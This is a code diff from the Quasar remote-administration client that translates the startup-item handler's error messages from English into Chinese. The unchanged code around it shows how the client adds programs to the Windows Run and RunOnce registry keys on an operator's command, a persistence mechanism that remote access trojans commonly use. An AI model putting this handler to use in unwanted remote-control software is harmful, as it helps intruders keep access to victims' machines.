@@ -1,4 +1,4 @@
-﻿using Microsoft.Win32;
+﻿﻿﻿using Microsoft.Win32;
 using Quasar.Client.Extensions;
 using Quasar.Client.Helper;
 using Quasar.Common.Enums;
@@ -120,7 +120,7 @@ namespace Quasar.Client.Messages
             }
             catch (Exception ex)
             {
-                client.Send(new SetStatus { Message = $"Getting Autostart Items failed: {ex.Message}" });
+                client.Send(new SetStatus { Message = $"获取自启动项失败: {ex.Message}" });
             }
         }
 
@@ -134,42 +134,42 @@ namespace Quasar.Client.Messages
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
                         {
-                            throw new Exception("Could not add value");
+                            throw new Exception("无法添加值");
                         }
                         break;
                     case StartupType.LocalMachineRunOnce:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
                         {
-                            throw new Exception("Could not add value");
+                            throw new Exception("无法添加值");
                         }
                         break;
                     case StartupType.CurrentUserRun:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
                         {
-                            throw new Exception("Could not add value");
+                            throw new Exception("无法添加值");
                         }
                         break;
                     case StartupType.CurrentUserRunOnce:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
                         {
-                            throw new Exception("Could not add value");
+                            throw new Exception("无法添加值");
                         }
                         break;
                     case StartupType.LocalMachineRunX86:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
                         {
-                            throw new Exception("Could not add value");
+                            throw new Exception("无法添加值");
                         }
                         break;
                     case StartupType.LocalMachineRunOnceX86:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
                         {
-                            throw new Exception("Could not add value");
+                            throw new Exception("无法添加值");
                         }
                         break;
                     case StartupType.StartMenu:
@@ -194,7 +194,7 @@ namespace Quasar.Client.Messages
             }
             catch (Exception ex)
             {
-                client.Send(new SetStatus { Message = $"Adding Autostart Item failed: {ex.Message}" });
+                client.Send(new SetStatus { Message = $"添加自启动项失败: {ex.Message}" });
             }
         }
 
